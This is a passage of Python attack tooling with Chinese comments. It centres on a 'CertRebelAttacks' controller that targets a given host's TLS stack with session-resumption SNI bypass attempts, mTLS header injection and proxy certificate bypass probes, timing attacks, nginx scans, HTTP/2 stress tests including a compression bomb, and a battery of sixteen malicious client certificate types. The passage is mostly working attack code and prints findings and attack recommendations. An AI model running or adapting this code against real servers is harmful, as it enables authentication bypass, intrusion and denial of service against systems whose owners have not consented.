        sigalgs = [0x0403, 0x0804, 0x0401]  # ecdsa_secp256r1_sha256, rsa_pss_rsae_sha256, rsa_pkcs1_sha256
        sig_list = self._u16(2*len(sigalgs)) + b''.join(self._u16(s) for s in sigalgs)
        exts.append(self._u16(0x000d) + self._u16(len(sig_list)) + sig_list)
        # psk_key_exchange_modes (0x002d) -> 01
        psk_modes = b'\x01\x01'
        exts.append(self._u16(0x002d) + self._u16(len(psk_modes)) + psk_modes)
        # key_share (0x0033)
        kse = self._u16(group) + self._u16(len(keyshare)) + keyshare
        ks_list = self._u16(len(kse)) + kse
        exts.append(self._u16(0x0033) + self._u16(len(ks_list)) + ks_list)
        exts_bytes = b''.join(exts)
        ch_body = (
            self._u16(0x0303) +  # legacy_version
            random +
            self._u8(len(session_id)) + session_id +
            self._u16(len(cipher_bytes)) + cipher_bytes +
            comp +
            self._u16(len(exts_bytes)) + exts_bytes
        )
        hs = b'\x01' + self._u24(len(ch_body)) + ch_body  # Handshake: ClientHello
        # TLS record: ContentType=0x16, legacy_record_version=0x0301
        rec = b'\x16\x03\x01' + self._u16(len(hs)) + hs
        return rec

class CertRebelAttacks:
    """证书社会学攻击主控制器"""
    # TSX 二次验证默认敏感路径
    TSX_TEST_PATHS = ['/', '/admin', '/api/internal', '/management', '/dashboard']
    
    def __init__(self, target_host, tls_port=443, timeout=5.0, origin_ip=None, verbosity: Optional[str] = None, log_format: Optional[str] = None):
        self.target_host = target_host
        self.tls_port = tls_port
        self.timeout = timeout
        self.origin_ip = origin_ip

        # 日志配置（可选）
        if verbosity:
            level = getattr(logging, str(verbosity).upper(), logging.INFO)
            logger.setLevel(level)
        if log_format:
            for h in logger.handlers:
                try:
                    h.setFormatter(logging.Formatter(log_format))
                except Exception:
                    pass
        
        # 初始化攻击组件
        self.tsx_attack = TSXAttack(target_host, tls_port, timeout)
        self.mtls_leak = mTLSTrustLeakage(target_host, tls_port, timeout)
        self.cdn_analyzer = CDNCertAnalyzer(target_host, target_host, origin_ip, timeout)
        self.timing_analyzer = CertChainTimingAnalyzer(target_host, tls_port, timeout)
        self.nginx_scanner = NginxCertVulnScanner(target_host, tls_port, timeout)
        
        # 新增Wasm分析器 - 正确的职责分工
        from wasm_runtime_analyzer import WasmRuntimeAnalyzer
        self.wasm_analyzer = WasmRuntimeAnalyzer(target_host, tls_port, timeout)
        
        # 初始化EC证书攻击组件
        self.ec_probe_factory = None
        self.ec_curve = None
        if P256_MODULE_AVAILABLE:
            try:
                self.ec_probe_factory = ECProbeFactory()
                self.ec_curve = P256EllipticCurve()
                logger.info("EC certificate attack components initialized")
            except Exception as e:
                logger.warning(f"Failed to initialize EC components: {e}")
                self.ec_probe_factory = None
                self.ec_curve = None

        # Optional: external TLS keyshare injector plugin (builtin default provided)
        self.keyshare_injector = BuiltinTLSKeyshareInjector()  # expects: .try_tls_keyshare(host, port, x:int, y:int) -> (accepted:bool, evidence:str)
        # Configurable thresholds
        self.cfg = {
            'proxy_confidence_threshold': 0.5,
            'bootstrap_B': 1000,
            'http2_stress': 'low'  # low|medium|high
        }
    
    async def run_all_attacks(self, weak_sni=None, strong_sni=None):
        """运行所有证书攻击"""
        
        results = {
            'target': f"{self.target_host}:{self.tls_port}",
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'attacks': {}
        }
        
        print(f"[*] Starting certificate rebel attacks against {self.target_host}")
        
        # 自适应预算（基于 orchestrator 传入的 timeout）
        global_timeout = float(getattr(self, 'timeout', 300.0) or 300.0)
        self._budget_proxy_bypass = min(max(global_timeout * 0.30, 60.0), 240.0)
        self._budget_nginx_scan = min(max(global_timeout * 0.40, 60.0), 300.0)
        
        # 1. TSX攻击（自动化版本）
        print(f"\n[*] Running TSX attack...")
        tsx_results = await self._automated_tsx_attack(weak_sni, strong_sni)
        if tsx_results.get('success'):
            verification = await self._verify_tsx_impact(tsx_results.get('weak_sni'), tsx_results.get('strong_sni'))
            tsx_results['verification'] = verification
            if verification.get('bypass_confirmed'):
                tsx_results['severity'] = 'critical'
                tsx_results['classification'] = 'confirmed'
            else:
                tsx_results['severity'] = 'high'
                tsx_results['classification'] = 'potential'
        results['attacks']['tsx'] = tsx_results

        # 2. mTLS信任泄漏
        logger.info("Testing mTLS trust leakage...")
        
        # 检测代理
        proxy_result = await self.mtls_leak.detect_proxy_behavior()
        
        # 测试头部注入
        header_results = await self.mtls_leak.test_header_injection()
        
        vulnerable_headers = [r for r in header_results if r.get('vulnerable') == True]
        
        results['attacks']['mtls_leak'] = {
            'proxy_detected': proxy_result['proxy_detected'],
            'proxy_confidence': proxy_result['confidence'],
            'vulnerable_headers': len(vulnerable_headers),
            'header_details': vulnerable_headers[:3],  # 只保存前3个
            'total_tests': len(header_results)
        }
        
        if vulnerable_headers:
            logger.info("Found %s vulnerable header injection points", len(vulnerable_headers))
        else:
            logger.info("No header injection vulnerabilities found")
        
        # 3. HTTP代理证书穿透攻击（预算内执行）
        logger.info("Testing HTTP proxy certificate bypass...")
        # 让子模块感知预算
        setattr(self.mtls_leak, 'soft_budget_seconds', self._budget_proxy_bypass)
        proxy_bypass_results = await self.mtls_leak.test_proxy_cert_bypass()
        
        critical_bypasses = [r for r in proxy_bypass_results if r.get('critical') == True]
        
        results['attacks']['proxy_cert_bypass'] = {
            'critical_bypasses': len(critical_bypasses),
            'bypass_details': critical_bypasses[:5],  # 只保存前5个
            'total_tests': len(proxy_bypass_results)
        }
        
        if critical_bypasses:
            logger.warning("Found %s critical certificate bypass vulnerabilities", len(critical_bypasses))
        else:
            logger.info("No certificate bypass vulnerabilities found")
        
        # 4. CDN证书链分析
        if self.origin_ip:
            logger.info("Analyzing CDN-Origin certificate mismatch...")
            cdn_analysis = await self.cdn_analyzer.analyze_cdn_cert_mismatch()
            sni_routing_test = await self.cdn_analyzer.test_sni_routing_bypass()
            
            results['attacks']['cdn_cert_analysis'] = {
                'mismatches': len(cdn_analysis.get('mismatches', [])),
                'vulnerabilities': len(cdn_analysis.get('vulnerabilities', [])),
                'routing_issues': len(sni_routing_test.get('routing_issues', [])),
                'mismatch_details': cdn_analysis.get('mismatches', [])[:3],
                'vulnerability_details': cdn_analysis.get('vulnerabilities', [])[:3]
            }
            
            total_issues = (len(cdn_analysis.get('mismatches', [])) + 
                          len(cdn_analysis.get('vulnerabilities', [])) + 
                          len(sni_routing_test.get('routing_issues', [])))
            
            if total_issues > 0:
                print(f"[+] Found {total_issues} CDN certificate configuration issues")
            else:
                print(f"[-] No CDN certificate issues detected")
        else:
            print(f"[!] Skipping CDN analysis (need origin IP)")
            results['attacks']['cdn_cert_analysis'] = {'skipped': 'Missing origin IP'}
        
        # 5. 证书链时序差分攻击
        print(f"\n[*] Running certificate chain timing analysis...")
        try:
            timing_analysis = await self.timing_analyzer.advanced_cert_timing_attack()
            
            validation_insights = timing_analysis.get('validation_logic_insights', [])
            potential_bypasses = timing_analysis.get('potential_bypasses', [])
            
            results['attacks']['cert_timing_analysis'] = {
                'insights_count': len(validation_insights),
                'bypasses_count': len(potential_bypasses),
                'timing_profiles': timing_analysis.get('timing_profiles', {}),
                'key_insights': validation_insights[:3],  # 保存前3个关键发现
                'critical_bypasses': potential_bypasses[:3]  # 保存前3个关键绕过
            }
            
            if potential_bypasses:
                print(f"[+] Found {len(potential_bypasses)} potential timing-based bypasses")
            if validation_insights:
                print(f"[+] Discovered {len(validation_insights)} validation logic insights")
            if not potential_bypasses and not validation_insights:
                print(f"[-] No significant timing patterns detected")
                
        except Exception as e:
            print(f"[-] Certificate timing analysis failed: {e}")
            results['attacks']['cert_timing_analysis'] = {'error': str(e)}
        
        # 6. 证书链短路确认测试
        print(f"\n[*] Testing certificate chain validation bypass...")
        try:
            chain_bypass_result = await self.test_certificate_chain_bypass()
            
            results['attacks']['cert_chain_bypass'] = chain_bypass_result
            
            if chain_bypass_result['status'] == 'Vulnerable':
                print(f"[CRITICAL] {chain_bypass_result['impact']}")
                print(f"    Evidence: {chain_bypass_result['evidence']}")
            elif chain_bypass_result['status'] == 'Secure':
                print(f"[+] Certificate validation is secure")
                print(f"    Evidence: {chain_bypass_result['evidence']}")
            else:
                print(f"[!] Certificate chain test: {chain_bypass_result['status']}")
                print(f"    Details: {chain_bypass_result.get('evidence', 'No details')}")
                
        except Exception as e:
            print(f"[-] Certificate chain bypass test failed: {e}")
            results['attacks']['cert_chain_bypass'] = {'error': str(e)}
        
        # 7. nginx特有证书链漏洞扫描（预算内执行）
        print(f"\n[*] Scanning nginx-specific certificate vulnerabilities...")
        try:
            nginx_scan_results = await self.nginx_scanner.scan_nginx_cert_vulnerabilities(budget_seconds=self._budget_nginx_scan)
            
            # 调试输出
            # Nginx scan completed
            
            total_vulns = len(nginx_scan_results.get('vulnerabilities', []))
            total_misconfigs = len(nginx_scan_results.get('misconfigurations', []))
            total_ssl_issues = len(nginx_scan_results.get('ssl_config_issues', []))
            
            # Nginx scan stats calculated
            
            high_severity_vulns = [v for v in nginx_scan_results.get('vulnerabilities', []) if v.get('severity') == 'high']
            
            results['attacks']['nginx_cert_vulns'] = {
                'nginx_version': nginx_scan_results.get('nginx_version'),
                'total_vulnerabilities': total_vulns,
                'total_misconfigurations': total_misconfigs,
                'total_ssl_issues': total_ssl_issues,
                'high_severity_count': len(high_severity_vulns),
                'critical_findings': high_severity_vulns[:3],  # 保存前3个高严重性漏洞
                'ssl_variable_leaks': [m for m in nginx_scan_results.get('misconfigurations', []) if m.get('type') == 'nginx_ssl_variable_leak'][:3]
            }
            
            if high_severity_vulns:
                print(f"[CRITICAL] Found {len(high_severity_vulns)} high-severity nginx vulnerabilities")
            elif total_vulns > 0:
                print(f"[+] Found {total_vulns} nginx certificate vulnerabilities")
            
            if total_misconfigs > 0:
                print(f"[+] Found {total_misconfigs} nginx SSL configuration issues")
            
            if total_vulns == 0 and total_misconfigs == 0 and total_ssl_issues == 0:
                print(f"[-] No nginx-specific certificate issues detected")
                
        except Exception as e:
            import traceback
            print(f"[-] nginx vulnerability scan failed: {e}")
            # Nginx scan error handled
            results['attacks']['nginx_cert_vulns'] = {'error': str(e)}
        
        # 8. HTTP/2 最小分析与负载/错误量化（复用现有 h2_cfs 工具）
        logger.info("Running minimal HTTP/2 analysis...")
        try:
            h2_results = await self._run_http2_minimal_analysis()
            results['attacks']['http2_minimal'] = h2_results
        except Exception as e:
            logger.warning("HTTP/2 minimal analysis failed: %s", e)
            results['attacks']['http2_minimal'] = {'error': str(e)}

        # 9. 云原生架构识别和Wasm运行时分析（合并以避免重复调用）
        print(f"\n[*] Detecting cloud-native architecture characteristics...")
        try:
            # 使用Wasm分析器进行全面的架构检测和安全分析
            wasm_analysis = await self.wasm_analyzer.comprehensive_wasm_security_analysis(posture='intelligent')
            
            # 保存完整的Wasm分析结果
            results['attacks']['wasm_analysis'] = wasm_analysis
            
            # 提取架构分析信息
            detection_results = wasm_analysis.get('detection_results', {})
            overall_assessment = wasm_analysis.get('overall_assessment', {})
            
            # 构建架构分析摘要（置信度限制至0.7，上报为信息性）
            raw_conf = detection_results.get('confidence', 0) / 100.0
            capped_conf = min(0.7, max(0.0, raw_conf))
            architecture_analysis = {
                'architecture_type': detection_results.get('runtime_type', 'Unknown'),
                'confidence': capped_conf,
                'classification': 'informational',
                'security_implications': [],
                'wasm_detected': detection_results.get('runtime_type', '').startswith('Wasm'),
                'security_score': overall_assessment.get('security_score', 0),
                'risk_level': overall_assessment.get('risk_level', 'Unknown'),
                'raw_analysis': wasm_analysis
            }
            
            results['attacks']['architecture_analysis'] = architecture_analysis
            
            # 显示检测结果
            arch_type = architecture_analysis.get('architecture_type', 'Unknown')
            confidence = architecture_analysis.get('confidence', 0)
            
            print(f"[*] Architecture detected: {arch_type} (confidence: {confidence:.2f})")
            
            # 如果检测到Wasm运行时，显示详细信息
            if overall_assessment and overall_assessment.get('security_score', 0) > 0:
                print(f"[+] Wasm security analysis completed")
                print(f"    Security Score: {overall_assessment.get('security_score', 0)}/100")
                print(f"    Risk Level: {overall_assessment.get('risk_level', 'Unknown')}")
                
                if detection_results.get('confidence', 0) > 0:
                    print(f"    Detection Confidence: {detection_results.get('confidence', 0)}%")
                    print(f"    Runtime Type: {detection_results.get('runtime_type', 'Unknown')}")
            else:
                print(f"[+] No significant Wasm runtime characteristics detected")
                
            # 显示安全建议（如果有）
            implications = architecture_analysis.get('security_implications', [])
            if implications:
                print(f"[*] Security implications:")
                for implication in implications[:3]:  # 显示前3个
                    print(f"    - {implication}")
                    
            recommendations = architecture_analysis.get('attack_recommendations', [])
            if recommendations:
                print(f"[*] Attack recommendations:")
                for rec in recommendations[:3]:  # 显示前3个
                    print(f"    - {rec}")
                    
        except Exception as e:
            print(f"[-] Architecture and Wasm analysis failed: {e}")
            import traceback
            # Error handled with traceback
            results['attacks']['architecture_analysis'] = {'error': str(e)}
            results['attacks']['wasm_analysis'] = {'error': str(e)}
        
        # 9. [移除] Nginx DoS分析 - 不属于证书攻击范畴，已迁移到专门的DoS分析模块
        
        # 11. OCSP软失败验证（集成版本）
        print(f"\n[*] Running OCSP soft-fail verification...")
        try:
            ocsp_verification = await self.verify_ocsp_soft_fail()
            
            results['attacks']['ocsp_soft_fail'] = ocsp_verification
            
            if ocsp_verification.get('vulnerability', False):
                status = ocsp_verification.get('status', 'Unknown')
                print(f"[CRITICAL] OCSP Soft-Fail Vulnerability: {ocsp_verification.get('security_impact', 'OCSP validation weakness detected')}")
                print(f"    Status: {status}")
                print(f"    OCSP URL: {ocsp_verification.get('ocsp_url', 'Unknown')}")
                print(f"    Evidence: {ocsp_verification.get('evidence', 'No evidence')}")
            else:
                status = ocsp_verification.get('status', 'Unknown')
                print(f"[+] OCSP Validation Security: {ocsp_verification.get('evidence', 'Validation appears secure')}")
                if status != 'No_OCSP':
                    print(f"    Status: {status}")
                    print(f"    OCSP URL: {ocsp_verification.get('ocsp_url', 'Unknown')}")
                
        except Exception as e:
            print(f"[-] OCSP soft-fail verification failed: {e}")
            results['attacks']['ocsp_soft_fail'] = {'error': str(e)}
        
        # 12. EC椭圆曲线证书攻击 - 使用p256_elliptic模块的高级攻击
        print(f"\n[*] Running EC elliptic curve certificate attacks...")
        ec_attack_results = await self.run_ec_certificate_attacks()
        results['attacks']['ec_certificate'] = ec_attack_results
        
        # 13. 恶意证书全谱攻击 - 使用所有MaliciousCertFactory的强大方法
        print(f"\n[*] Running malicious certificate full-spectrum attack...")
        try:
            cert_factory = MaliciousCertFactory()
            malicious_cert_results = {
                'tested_methods': [],
                'vulnerabilities_found': [],
                'security_assessment': {}
            }
            
            # 测试所有恶意证书类型（包括EC椭圆曲线攻击）
            test_cases = [
                ('extreme_cert', lambda: cert_factory.create_extreme_cert(self.target_host)),
                ('unicode_confusion', lambda: cert_factory.create_unicode_confusion_cert(self.target_host)),
                ('extension_overflow', lambda: cert_factory.create_extension_overflow_cert(self.target_host)),
                ('time_confusion', lambda: cert_factory.create_time_confusion_cert(self.target_host)),
                ('weak_signature', lambda: cert_factory.create_weak_signature_cert(self.target_host)),
                ('critical_extension_bypass', lambda: cert_factory.create_critical_extension_bypass_cert(self.target_host)),
                ('wildcard_confusion', lambda: cert_factory.create_wildcard_confusion_cert(self.target_host)),
                ('ct_bypass', lambda: cert_factory.create_certificate_transparency_bypass_cert(self.target_host)),
                ('cross_signed_leaf', lambda: cert_factory.create_cross_signed_leaf(self.target_host)),
                # 新增EC椭圆曲线证书攻击
                ('weak_ec_p256', lambda: cert_factory.create_weak_ec_cert(self.target_host, 'weak_p256')),
                ('weak_ec_p192', lambda: cert_factory.create_weak_ec_cert(self.target_host, 'weak_p192')),
                ('weak_ec_secp256k1', lambda: cert_factory.create_weak_ec_cert(self.target_host, 'secp256k1')),
                ('invalid_ec_point', lambda: cert_factory.create_invalid_ec_point_cert(self.target_host)),
                ('ecdsa_nonce_bias', lambda: cert_factory.create_ecdsa_nonce_bias_cert(self.target_host)),
                ('sct_embedded', lambda: cert_factory.create_sct_embedded_cert(self.target_host)),
                ('san_explosion', lambda: cert_factory.create_san_explosion_cert(self.target_host, explosion_size=500))
            ]
            
            print(f"[*] Testing {len(test_cases)} malicious certificate types...")
            vulnerable_count = 0
            
            for test_name, cert_creator in test_cases:
                try:
                    print(f"[*] Testing {test_name}...", end='', flush=True)
                    
                    # 创建恶意证书
                    malicious_cert_data = cert_creator()
                    
                    # 测试服务器是否接受
                    test_result = await self._test_malicious_cert_acceptance(
                        test_name, 
                        malicious_cert_data
                    )
                    
                    malicious_cert_results['tested_methods'].append(test_name)
                    
                    if test_result['accepted']:
                        print(f" [VULNERABLE!]")
                        vulnerable_count += 1
                        malicious_cert_results['vulnerabilities_found'].append({
                            'type': test_name,
                            'severity': test_result.get('severity', 'high'),
                            'evidence': test_result.get('evidence', 'Certificate accepted'),
                            'impact': test_result.get('impact', 'Security bypass possible')
                        })
                    else:
                        print(f" [secure]")
                        
                except Exception as e:
                    print(f" [error: {type(e).__name__}]")
                    
            # 总结
            malicious_cert_results['security_assessment'] = {
                'total_tested': len(test_cases),
                'vulnerabilities_found': vulnerable_count,
                'security_score': ((len(test_cases) - vulnerable_count) / len(test_cases)) * 100,
                'risk_level': 'CRITICAL' if vulnerable_count > 3 else 'HIGH' if vulnerable_count > 1 else 'MEDIUM' if vulnerable_count > 0 else 'LOW'
            }
            
            results['attacks']['malicious_cert_spectrum'] = malicious_cert_results
            
            # 打印结果
            print(f"[*] Malicious certificate spectrum analysis complete")
            print(f"    Tested: {malicious_cert_results['security_assessment']['total_tested']} certificate types")
            print(f"    Vulnerabilities: {vulnerable_count}")
            print(f"    Security Score: {malicious_cert_results['security_assessment']['security_score']:.1f}%")
            print(f"    Risk Level: {malicious_cert_results['security_assessment']['risk_level']}")
            
            if vulnerable_count > 0:
                print(f"[CRITICAL] Server accepts {vulnerable_count} types of malicious certificates:")
                for vuln in malicious_cert_results['vulnerabilities_found'][:3]:  # 显示前3个
                    print(f"    - {vuln['type']}: {vuln['impact']}")
                    
        except Exception as e:
            print(f"[-] Malicious certificate spectrum attack failed: {e}")
            import traceback
            # Error handled with traceback
            results['attacks']['malicious_cert_spectrum'] = {'error': str(e)}
        
        # 清理session池
        try:
            self.tsx_attack.cleanup_sessions()
        except Exception as e:
            print(f"[-] Session cleanup failed: {e}")
        
        return results

    async def _verify_tsx_impact(self, weak_sni: Optional[str], strong_sni: Optional[str]) -> Dict[str, Any]:
        """二次验证TSX影响：
        - 对 strong_sni 发起基线请求（无会话复用）
        - 使用弱门会话对 strong_sni 发起“会话复用”请求（pyOpenSSL）
        - 对比响应（状态/头/内容），需要出现敏感特征或鉴权头才算 bypass_confirmed
        """
        try:
            paths = list(self.TSX_TEST_PATHS)
            findings = []
            confirmed = False
            for path in paths:
                baseline = await asyncio.to_thread(self._https_fetch_sync, strong_sni, path)
                attack = await asyncio.to_thread(self._tsx_resumed_fetch_sync, weak_sni, strong_sni, path)
                ev = self.mtls_leak._detect_auth_bypass(baseline, attack, path, 'TSX')
                findings.append({'path': path, 'evidence': ev, 'baseline': baseline.get('status'), 'attack': attack.get('status')})
                if ev:
                    confirmed = True
                    break
            return {'bypass_confirmed': confirmed, 'findings': findings}
        except Exception as e:
            return {'bypass_confirmed': False, 'error': str(e)}

    def _https_fetch_sync(self, sni: str, path: str) -> Dict[str, Any]:
        import ssl, socket
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((self.target_host, self.tls_port), timeout=self.timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=sni) as ssock:
                    req = f"GET {path} HTTP/1.1\r\nHost: {sni}\r\nConnection: close\r\n\r\n".encode()
                    ssock.send(req)
                    data = b''
                    while True:
                        chunk = ssock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
            txt = data.decode('latin-1', errors='ignore')
            head, body = (txt.split("\r\n\r\n", 1) + [""])[:2]
            line = head.split('\r\n')[0] if head else ''
            status = int(line.split(' ')[1]) if ' ' in line else -1
            headers = {}
            for h in head.split('\r\n')[1:]:
                if ':' in h:
                    k, v = h.split(':', 1)
                    headers[k.strip()] = v.strip()
            return {'status': status, 'headers': headers, 'body': body[:2048], 'length': len(body)}
        except Exception as e:
            return {'status': 0, 'headers': {}, 'body': '', 'length': 0, 'error': str(e)}

    def _tsx_resumed_fetch_sync(self, weak_sni: Optional[str], strong_sni: str, path: str) -> Dict[str, Any]:
        if not PYOPENSSL_AVAILABLE:
            return {'status': 0, 'headers': {}, 'body': '', 'length': 0, 'error': 'pyOpenSSL unavailable'}
        try:
            sess_data = self.tsx_attack._load_session(weak_sni) if weak_sni else None
            if not sess_data:
                # as fallback, try to probe and load
                ok = asyncio.run(self.tsx_attack.probe_weak_sni(weak_sni)) if weak_sni else False
                if not ok:
                    return {'status': 0, 'headers': {}, 'body': '', 'length': 0, 'error': 'no session available'}
                sess_data = self.tsx_attack._load_session(weak_sni)
            session = sess_data['session']
            ctx = SSL.Context(SSL.TLSv1_2_METHOD)
            ctx.set_verify(SSL.VERIFY_NONE, lambda *args: True)
            ctx.set_options(SSL.OP_NO_SSLv2 | SSL.OP_NO_SSLv3)
            ctx.set_session_cache_mode(SSL.SESS_CACHE_CLIENT)
            sock = socket.create_connection((self.target_host, self.tls_port), self.timeout)
            conn = SSL.Connection(ctx, sock)
            conn.set_tlsext_host_name(strong_sni.encode('utf-8'))
            conn.set_connect_state()
            conn.set_session(session)
            safe_do_handshake(conn, strong_sni, self.timeout)
            http_req = f"GET {path} HTTP/1.1\r\nHost: {strong_sni}\r\nConnection: close\r\n\r\n"
            conn.send(http_req.encode())
            resp = b''
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
            except Exception:
                pass
            finally:
                conn.close()
            txt = resp.decode('latin-1', errors='ignore')
            head, body = (txt.split("\r\n\r\n", 1) + [""])[:2]
            line = head.split('\r\n')[0] if head else ''
            status = int(line.split(' ')[1]) if ' ' in line else -1
            headers = {}
            for h in head.split('\r\n')[1:]:
                if ':' in h:
                    k, v = h.split(':', 1)
                    headers[k.strip()] = v.strip()
            return {'status': status, 'headers': headers, 'body': body[:2048], 'length': len(body)}
        except Exception as e:
            return {'status': 0, 'headers': {}, 'body': '', 'length': 0, 'error': str(e)}

    async def _run_http2_minimal_analysis(self):
        """使用 h2_cfs 的最小集成，对 HTTP/2 进行连通性与少量压力测试，量化错误/退化。"""
        try:
            from h2_cfs import H2ContinuationConfusion
        except Exception as e:
            return {'skipped': f'h2 module unavailable: {e}'}
        
        try:
            attacker = H2ContinuationConfusion(self.target_host, self.tls_port, timeout=min(self.timeout, 10.0))
            # 连通性测试
            conn = await attacker.test_h2_connectivity()
            summary = {'connectivity': conn}
            if not conn.get('supported'):
                return {'supported': False, 'evidence': conn}

            stress = str(self.cfg.get('http2_stress', 'low')).lower()
            tests = []
            # 基础测试
            tests.append(('frame_boundaries', attacker.test_frame_size_boundaries))
            tests.append(('header_interleaving', attacker.test_header_interleaving))
            # 中档/高档增加
            if stress in ('medium','high'):
                tests.append(('duplicate_pseudo_headers', attacker.test_duplicate_pseudo_headers))
            if stress == 'high':
                tests.append(('hpack_compression_bomb', attacker.test_hpack_compression_attacks))

            requests_made = 0
            vulns = False
            for name, method in tests:
                res = await method()
                summary[name] = res
                requests_made += res.get('requests_made', 0)
                if res.get('vulnerable') or res.get('violations_accepted', 0) > 0 or res.get('duplicate_headers_accepted', 0) > 0:
                    vulns = True

            return {
                'supported': True,
                'tests': summary,
                'requests_made': requests_made,
                'vulnerable_indicators': vulns,
                'stress': stress
            }
        except Exception as e:
            return {'error': str(e)}
    
    async def _test_malicious_cert_acceptance(self, test_name, cert_data):
        """测试服务器是否接受恶意客户端证书（仅在mTLS要求时才有效）。
        步骤：
          1) 探测是否需要客户端证书（握手/响应中包含 certificate required 等信号）
          2) 仅当需要mTLS时，才加载并发送客户端证书，观察访问是否出现“受保护资源”的差分证据
        结果：classification = informational/potential/confirmed
        """
        import ssl, socket, tempfile, os
        from cryptography.hazmat.primitives import serialization
        
        def need_mtls_probe() -> Dict[str, Any]:
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with socket.create_connection((self.target_host, self.tls_port), timeout=self.timeout) as sock:
                    with ctx.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                        # 简单请求
                        req = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n".encode()
                        ssock.send(req)
                        data = ssock.recv(1024).decode('utf-8', errors='ignore')
                        if any(k in data.lower() for k in ['certificate required','client certificate','ssl_client_verify']):
                            return {'mtls_required': True, 'evidence': data[:200]}
                        # 正常200/302等视为不要求mTLS
                        return {'mtls_required': False, 'evidence': data[:200]}
            except ssl.SSLError as e:
                if 'certificate' in str(e).lower():
                    return {'mtls_required': True, 'evidence': str(e)}
                return {'mtls_required': False, 'evidence': str(e)}
            except Exception as e:
                return {'mtls_required': False, 'evidence': str(e)}
        
        # 1) 探测mTLS
        probe = need_mtls_probe()
        if not probe.get('mtls_required'):
            return {'accepted': False, 'classification': 'informational', 'evidence': 'Server does not require client certificate'}
        
        # 2) 解析输入
        try:
            if isinstance(cert_data, tuple) and len(cert_data) == 2:
                cert, key = cert_data
            elif isinstance(cert_data, dict):
                if 'cert' in cert_data and 'key' in cert_data:
                    cert, key = cert_data['cert'], cert_data['key']
                elif 'strict_chain' in cert_data or 'loose_chain' in cert_data:
                    chain = cert_data.get('loose_chain', cert_data.get('strict_chain'))
                    cert = chain[0] if chain else None
                    key = cert_data.get('leaf_key')
                else:
                    return {'accepted': False, 'classification': 'informational', 'evidence': 'Invalid cert_data'}
            else:
                cert, key = cert_data, None
            if not (cert and key):
                return {'accepted': False, 'classification': 'informational', 'evidence': 'Missing key for client cert test'}
        except Exception as e:
            return {'accepted': False, 'classification': 'informational', 'evidence': f'Parse error: {e}'}
        
        # 3) 发送客户端证书并观察差分访问证据
        with tempfile.NamedTemporaryFile(mode='w', suffix='.pem', delete=False) as cert_file:
            cert_pem = cert.public_bytes(encoding=serialization.Encoding.PEM) if hasattr(cert, 'public_bytes') else str(cert).encode()
            cert_file.write(cert_pem.decode('utf-8') if isinstance(cert_pem, (bytes, bytearray)) else cert_pem)
            cert_path = cert_file.name
        with tempfile.NamedTemporaryFile(mode='w', suffix='.key', delete=False) as key_file:
            key_pem = key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption()) if hasattr(key, 'private_bytes') else str(key).encode()
            key_file.write(key_pem.decode('utf-8') if isinstance(key_pem, (bytes, bytearray)) else key_pem)
            key_path = key_file.name
        
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.load_cert_chain(cert_path, key_path)
            with socket.create_connection((self.target_host, self.tls_port), timeout=self.timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                    # 差分：先请求受保护路径集合中的一个（保守使用 '/'，需要用户提供更敏感路径以增强确认）
                    req = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n".encode()
                    ssock.send(req)
                    data = ssock.recv(2048).decode('utf-8', errors='ignore')
                    # 判定：状态改善 + 管理特征/鉴权头
                    status_line = data.split('\r\n')[0] if data else ''
                    status = int(status_line.split(' ')[1]) if ' ' in status_line else 0
                    sensitive = any(k in data.lower() for k in ['admin','dashboard','management','x-user','set-cookie'])
                    if 200 <= status < 400 and sensitive:
                        return {'accepted': True, 'classification': 'confirmed', 'evidence': status_line}
                    return {'accepted': True, 'classification': 'potential', 'evidence': status_line}
        except ssl.SSLError as e:
            return {'accepted': False, 'classification': 'informational', 'evidence': f'SSL error: {e}'}
        except Exception as e:
            return {'accepted': False, 'classification': 'informational', 'evidence': f'Error: {e}'}
        finally:
            try:
                os.unlink(cert_path)
                os.unlink(key_path)
            except Exception:
                pass
    
    def _get_cert_attack_impact(self, test_name):
        """获取不同证书攻击的影响说明"""
        impacts = {
            'extreme_cert': 'Parser overflow or DoS possible via extreme certificate fields',
            'unicode_confusion': 'Domain spoofing possible via Unicode homograph attack',
            'extension_overflow': 'Buffer overflow possible via malformed extensions',
            'time_confusion': 'Certificate validity bypass via time confusion',
            'weak_signature': 'Weak cryptography allows certificate forgery',
            'critical_extension_bypass': 'Security controls bypass via unrecognized critical extensions',
            'wildcard_confusion': 'Subdomain takeover via wildcard confusion',
            'ct_bypass': 'Certificate transparency bypass allows unlogged certificates',
            'cross_signed_leaf': 'Trust chain confusion via cross-signed certificates',
            'sct_embedded': 'CT log manipulation via embedded SCT',
            'san_explosion': 'DoS via SAN list resource exhaustion'
        }
        return impacts.get(test_name, 'Security bypass possible')
    
    async def _automated_tsx_attack(self, weak_sni=None, strong_sni=None):
        """自动化TSX攻击 - SAN自动枚举 + 三层验证逻辑"""
        
        # 如果已经提供了SNI参数，直接使用
        if weak_sni and strong_sni:
            print(f"[*] Using provided SNI: {weak_sni} -> {strong_sni}")
            success, message = await self.tsx_attack.run_tsx_attack(weak_sni, strong_sni)
            return {
                'success': success,
                'message': message,
                'weak_sni': weak_sni,
                'strong_sni': strong_sni,
                'attack_mode': 'manual'
            }
        
        # 自动化模式：从证书SAN中枚举候选SNI
        print(f"[*] Auto-enumerating SNI candidates from certificate SAN...")
        
        try:
            # 获取目标证书的SAN列表
            san_domains = await self._extract_certificate_san_domains()
            
            if not san_domains:
                return {'skipped': 'No SAN domains found in certificate'}
            
            print(f"[*] Found {len(san_domains)} SAN domains: {', '.join(san_domains[:5])}...")
            
            # 自动分类弱门vs强门SNI
